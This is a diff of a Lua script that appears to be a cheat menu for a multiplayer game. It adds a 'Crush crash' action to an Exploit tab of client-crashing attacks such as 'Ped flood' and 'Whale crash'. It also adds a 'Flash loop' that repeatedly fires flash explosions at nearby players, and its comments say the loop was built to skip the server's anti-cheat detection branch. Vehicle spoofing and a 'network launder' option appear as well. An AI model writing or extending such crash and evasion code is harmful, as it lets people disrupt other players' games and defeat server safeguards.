     if Menu.SelectedKey == 0x2E then return false end
+    if type(O) == "table" and type(O.log) == "function" then
+        O.log("delete: edge (category=%s)", tostring(Menu.OpenedCategory))
+    end
 
     -- Main page: close. This is the action the operator asked for and the one
     -- the library's Backspace path cannot produce.
     if Menu.OpenedCategory == nil then
-        return hideMenu()
+        return hideMenu(fromFrame)
     end
 
     -- Inside a category: the same navigation the library applies to Backspace.
@@ -28223,7 +28898,7 @@ local function deleteTick()
                 Menu.UpdateCategoriesFromTopTab()
             end
         else
-            Menu.Visible = false
+            return hideMenu(fromFrame)
         end
     else
         Menu.OpenedCategory = nil
@@ -28236,7 +28911,7 @@ end
 
 -- Internal test seams. They are not menu rows and are not exposed in any
 -- category; keeping them on Menu lets the offline harness drive the same
--- functions the injected hook and the scheduler use.
+-- functions the wrapper and the scheduler use.
 Menu.__vgd_hide = hideMenu
 Menu.__vgdDeleteTick = deleteTick
 Menu.__vgd_watchDelete = deleteTick
@@ -28933,7 +29608,8 @@ end
 
 -- ---------------------------------------------------------------------------
 -- PROTECTION
--- Only local-ped recovery. No hooks, no spoof, no firewall, no entity edits.
+-- Local-ped recovery plus the client-side Ped Crasher guard. No hooks, no
+-- spoof, no firewall, no entity creation and no entity deletion.
 --
 -- A.boot() has already called A.defaultsOn() when this function runs, so the
 -- rows read the live flags. Hard-coding true here would show "on" even if the
@@ -28943,6 +29619,7 @@ local function installProtection()
     local antiFreeze
     local antiAttach
     local antiSpectate
+    local pedCrasher
     local networkLaunder
     local quietLogs
 
@@ -28973,6 +29650,18 @@ local function installProtection()
         end,
     }
 
+    -- Operator-facing name is "Ped Crasher"; the implementation is a local
+    -- guard, not a crasher. It hides a detected local ped flood for the current
+    -- frame and never creates, tasks, deletes or replicates an entity.
+    pedCrasher = {
+        name = "Ped Crasher",
+        type = "toggle",
+        value = A.flags.pedGuard,
+        onClick = function(v)
+            pedCrasher.value = A.setPedGuard(v)
+        end,
+    }
+
     networkLaunder = {
         name = "Network launder",
         type = "toggle",
@@ -28998,11 +29687,12 @@ local function installProtection()
         antiFreeze.value = A.flags.antiFreeze
         antiAttach.value = A.flags.antiAttach
         antiSpectate.value = A.flags.antiSpectate
+        pedCrasher.value = A.flags.pedGuard
         networkLaunder.value = A.flags.networkLaunder
         quietLogs.value = A.flags.quietLogs
     end
 
-    -- The three protections now live under Settings, not in a top-level
+    -- The four protections now live under Settings, not in a top-level
     -- category. The category is removed on every load so an older loader
     -- instance cannot leave a second copy behind. Settings is a base category;
     -- if a stripped build does not ship it, create it with the same tab so the
@@ -29039,6 +29729,7 @@ local function installProtection()
         antiFreeze,
         antiAttach,
         antiSpectate,
+        pedCrasher,
         { name = "", isSeparator = true, separatorText = "Network" },
         networkLaunder,
         quietLogs,
@@ -29047,23 +29738,26 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > EXPLOIT (THREE CRASH ACTIONS)
+-- EXPLOIT > EXPLOIT (FOUR CRASH ACTIONS)
 --
--- Three independent actions: `Ped flood`, `Whale crash`, `Emote crash`.
--- There is no shared Method selector, no Intensity slider, no target row and
--- no Launch/Stop row. One click selects one engine, one target window and one
--- wire signature. The tab lives inside Exploit instead of a top-level category:
--- fewer top-level rows, and the crash actions sit next to the other exploit
--- actions. Any stale top-level Crasher category from an older loader is removed
--- on every load. The tab itself is named "Exploit"; "Crasher" is only the
--- historical module name and the old tab label that is merged into it.
+-- Four independent actions: `Ped flood`, `Whale crash`, `Emote crash` and
+-- `Crush crash`. The first three call C.launch(kind); the fourth is the sink's
+-- slam/vehicle-explosion path with a respawn hold, built for the b3095
+-- +51DE0F window. There is no shared Method selector, no Intensity slider, no
+-- target row and no Launch/Stop row. One click selects one engine, one target
+-- window and one wire signature. The tab lives inside Exploit instead of a
+-- top-level category: fewer top-level rows, and the crash actions sit next to
+-- the other exploit actions. Any stale top-level Crasher category from an
+-- older loader is removed on every load. The tab itself is named "Exploit";
+-- "Crasher" is only the historical module name and the old tab label that is
+-- merged into it.
 -- ---------------------------------------------------------------------------
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
     "PTFX storm", "Clip swarm",
-    "Ped flood", "Whale crash", "Emote crash",
+    "Ped flood", "Whale crash", "Emote crash", "Crush crash",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -29113,13 +29807,15 @@ local function installCrasher()
         end
     end
 
-    -- Three direct actions. Each one calls C.launch(kind); the engine owns the
-    -- target window, spawn/task path and cleanup. Nothing is shared between
-    -- the three vectors, so a click never runs a mixed object/ped/emote loop.
+    -- Four direct actions. The first three call C.launch(kind); the engine owns
+    -- the target window, spawn/task path and cleanup. The fourth calls
+    -- G.start("crash"), the sink's borrowed-world-vehicle slam with the
+    -- respawn hold. Nothing is shared between the vectors, so a click never
+    -- runs a mixed object/ped/emote loop.
     --
     -- Prepend the crash block instead of appending it. The base Exploits tab
     -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
-    -- Staff, Revive); with ItemsPerPage = 8, the three crash rows and their
+    -- Staff, Revive); with ItemsPerPage = 8, the four crash rows and their
     -- separator stay on the first page and the server rows remain available
     -- underneath.
     local crashItems = {
@@ -29147,6 +29843,13 @@ local function installCrasher()
             type = "action",
             onClick = function()
                 C.launch("emote")
+            end,
+        },
+        {
+            name = "Crush crash",
+            type = "action",
+            onClick = function()
+                G.start("crash")
             end,
         },
     }
@@ -29224,13 +29927,14 @@ local function installSink()
     end
 
     -- Anchor after the LAST crash row when the block is present, so Ground
-    -- stays below all three crashers instead of splitting the block. If the
+    -- stays below all four crashers instead of splitting the block. If the
     -- crasher was not installed in this build, the block goes to the top.
     local at = 0
     for i = 1, #tab.items do
         local name = tab.items[i].name
         if name == "Clip swarm" or name == "Ped flood"
-            or name == "Whale crash" or name == "Emote crash" then
+            or name == "Whale crash" or name == "Emote crash"
+            or name == "Crush crash" then
             at = i
         end
     end
@@ -29260,6 +29964,76 @@ local function installSink()
 end
 
 Menu.__vgd_installSink = installSink
+
+-- ---------------------------------------------------------------------------
+-- EXPLOIT > FLASH
+--
+-- One toggle, no target row: FL takes Menu.SelectedPlayer, then the nearest
+-- living player inside 300 m. The flash itself is a game explosion of type 78
+-- (EXP_TAG_FLASHGRENADE) with damageScale 0.0, which returns from the V4
+-- explosion handler at line 59 before any detection branch. The tab is
+-- separate from the Exploit tab so the four crash rows and the Ground row
+-- stay on the first page; Flash is one click away.
+-- ---------------------------------------------------------------------------
+local function installFlash()
+    local category = findCategory("Exploit")
+    if not category then return false end
+    category.tabs = category.tabs or {}
+
+    for i = #category.tabs, 1, -1 do
+        local entry = category.tabs[i]
+        if entry and entry.name == "Flash" then
+            table.remove(category.tabs, i)
+        end
+    end
+
+    local toggle
+    toggle = {
+        name = "Flash loop",
+        type = "toggle",
+        value = FL.active == true,
+        onClick = function(value)
+            local active
+            if value then
+                active = FL.start()
+            else
+                FL.stop("operator")
+                active = false
+            end
+            toggle.value = active
+            return active
+        end,
+    }
+
+    local tab = {
+        name = "Flash",
+        items = {
+            {
+                name = "",
+                isSeparator = true,
+                separatorText = "Screen",
+            },
+            toggle,
+        },
+    }
+
+    table.insert(category.tabs, 2, tab)
+    Menu.__vgd_flashRow = toggle
+    Menu.__vgd_flashTab = tab
+
+    if not Menu.__vgd_flashSync and type(O) == "table" and type(O.every) == "function" then
+        Menu.__vgd_flashSync = true
+        O.every("flashToggleSync", 250, function()
+            local row = Menu.__vgd_flashRow
+            if row and row.value ~= FL.active then
+                row.value = FL.active
+            end
+        end)
+    end
+    return true
+end
+
+Menu.__vgd_installFlash = installFlash
 
 -- ---------------------------------------------------------------------------
 -- VEHICLE > SPOOFED
@@ -30521,6 +31295,7 @@ local function build()
     installProtection()
     installCrasher()
     installSink()
+    installFlash()
     installVehicleSpoof()
     installRampFix()
     reorderPlayerTabs()
@@ -30605,7 +31380,7 @@ UI.boot()
 return UI
 
 
-end)(O,S,E,D,F,V,M,SN,C,G,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
+end)(O,S,E,D,F,V,M,SN,C,G,FL,A,ST,SB,VS,K,N,L,VC,CU,UC,FA,TP,Menu)
 
 
 end)()
